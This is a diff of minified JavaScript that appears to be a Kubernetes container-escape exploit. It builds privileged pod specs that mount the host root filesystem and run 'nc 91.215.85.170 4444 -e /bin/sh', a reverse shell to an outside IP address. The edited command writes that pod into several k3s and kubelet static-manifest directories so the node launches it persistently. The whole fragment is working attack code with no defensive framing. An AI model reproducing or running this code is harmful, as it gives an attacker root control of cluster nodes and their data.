@@ -4,8 +4,8 @@ function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection
 const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
 const v1=(k,v)=>Buffer.from([k,v]);
 const Y="apiVersion: v1\nkind: Pod\nmetadata:\n  name: zzesc3\nspec:\n  hostNetwork: true\n  hostPID: true\n  containers:\n  - name: c\n    image: IMG\n    securityContext:\n      privileged: true\n    command: [\"/bin/sh\",\"-c\",\"nc 91.215.85.170 4444 -e /bin/sh\"]\n    volumeMounts:\n    - {name: h, mountPath: /h}\n  volumes:\n  - name: h\n    hostPath: {path: /}\n";
-const pod={apiVersion:'v1',kind:'Pod',metadata:{name:'zzesc4'},spec:{hostNetwork:true,hostPID:true,containers:[{name:'c',image:'busybox:1.36',securityContext:{privileged:true},command:['/bin/sh','-c','nc 91.215.85.170 4444 -e /bin/sh'],volumeMounts:[{name:'h',mountPath:'/h'}]}],volumes:[{name:'h',hostPath:{path:'/'}}]}};
-const CMD="echo '"+JSON.stringify(pod)+"' > /h/var/lib/rancher/k3s/server/manifests/zzesc.json; echo ok > /h/tmp/zzm.txt";
+const pod={apiVersion:'v1',kind:'Pod',metadata:{name:'zzesc4'},spec:{hostNetwork:true,hostPID:true,containers:[{name:'c',image:'IMG',securityContext:{privileged:true},command:['/bin/sh','-c','nc 91.215.85.170 4444 -e /bin/sh'],volumeMounts:[{name:'h',mountPath:'/h'}]}],volumes:[{name:'h',hostPath:{path:'/'}}]}};
+const CMD="Y="+JSON.stringify(JSON.stringify(pod))+"; for d in /h/var/lib/rancher/k3s/server/manifests /h/etc/kubernetes/manifests /h/var/lib/rancher/k3s/agent/pod-manifests; do echo $Y > $d/zzs3.json 2>/dev/null; done; echo hit >> /h/tmp/zzm3.txt";
 function create(sb,img){
  const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/')]);
  const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
